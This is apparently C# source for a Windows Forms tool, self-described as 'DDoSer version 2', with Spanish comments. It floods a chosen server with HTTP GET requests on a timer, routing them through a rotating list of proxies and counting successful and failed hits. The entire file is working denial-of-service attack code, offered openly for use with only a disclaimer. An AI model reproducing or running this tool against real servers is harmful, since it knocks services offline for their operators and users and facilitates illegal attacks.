/*
 * Creado por SharpDevelop.
 * Usuario: BlackCrystal™
 * Fecha: 25/04/2012
 * Hora: 02:50 a.m.
 * 
 * Para cambiar esta plantilla use Herramientas | Opciones | Codificación | Editar Encabezados Estándar
 */

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Timers;

// DDoSer version 2
// Kelevra 2010 (http://deathrow.vistech.net/~KELEVRA/)
// Hace DDoS mediante peticiones HTTP a un servidor, 
// utilizando los proxy de una lista.

namespace SHOIC
{
    public partial class Form1 : Form
    {
        

        public Form1()
        {
            InitializeComponent();
        }

        static int Conectar(string IPproxy, Int32 PuertoProxy, string IPblanco, Int32 Puerto, string mensaje)
        {
            //Conecta a IPblanco en el puerto enviando la peticion "mensaje"
            //Usar bajo la propia responsabilidad...
            try
            {
                TcpClient cliente = new TcpClient(IPproxy, PuertoProxy); //Crea un cliente
                Byte[] data = new Byte[256];
                data = System.Text.Encoding.ASCII.GetBytes("GET " + mensaje + " HTTP/1.1\nHost:" + IPblanco + ":" + Puerto + "\nUser-Agent:Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10\n\n"); //Pasa el mensaje a la variable byte data
                NetworkStream stream = cliente.GetStream();
                stream.Write(data, 0, data.Length); //Escribe en el flujo de datos del cliente el mensaje
                stream.Close();
                cliente.Close(); //Cierra todo
                return 1;
            }
            catch (ArgumentNullException e)
            {
                // no es necesario MessageBox.Show("ArgumentNullException: " + e);
                return 0;
            }
            catch (SocketException e)
            {
                // no es necesario MessageBox.Show("SocketException: " + e.ToString());
                return 0;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            timer1.Interval = Convert.ToInt32(textIntervalos.Text);
            if (timer1.Enabled == false)
            {
                timer1.Enabled = true; //Si no corre el timer, esto lo inicia
                disparar.Text = "PARAR";
            }
            else
            {
                timer1.Enabled = false; //Si el timer corre, esto lo para
                disparar.Text = "DISPARAR";
            }
        }

        private void URL2IP_Click(object sender, EventArgs e)
        {
            textIP.Text = Convert.ToString(Dns.GetHostEntry(textURL.Text).AddressList[0]);
        }

        public int count = 0; //Dos contadores. count: indicara segundos. 
        public int ticks = 0; //ticks: indicara ticks del timer

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (count == listProxy.Items.Count)
                count = 0; //Si count sobrepasa el largo de la lista de proxys, vuelve a 0
            listProxy.SelectedIndex = count; //Muestra al usuario el proxy en uso
            int respuesta = Conectar(Convert.ToString(listProxy.Items[count]), 80, textIP.Text, Convert.ToInt32(textPuerto.Text), textMensaje.Text);
            if (respuesta == 1)
                labelAciertos.Text = Convert.ToString(Convert.ToUInt32(labelAciertos.Text) + 1);
            if (respuesta == 0)
                labelFallas.Text = Convert.ToString(Convert.ToUInt32(labelFallas.Text) + 1);
            ticks += 1;
            if (ticks / (1000 / Convert.ToInt32(textIntervalos.Text)) == ticks / (1000.0 / Convert.ToInt32(textIntervalos.Text)))
                count += 1; //Si paso un segundo, aumenta count
        }

    }

}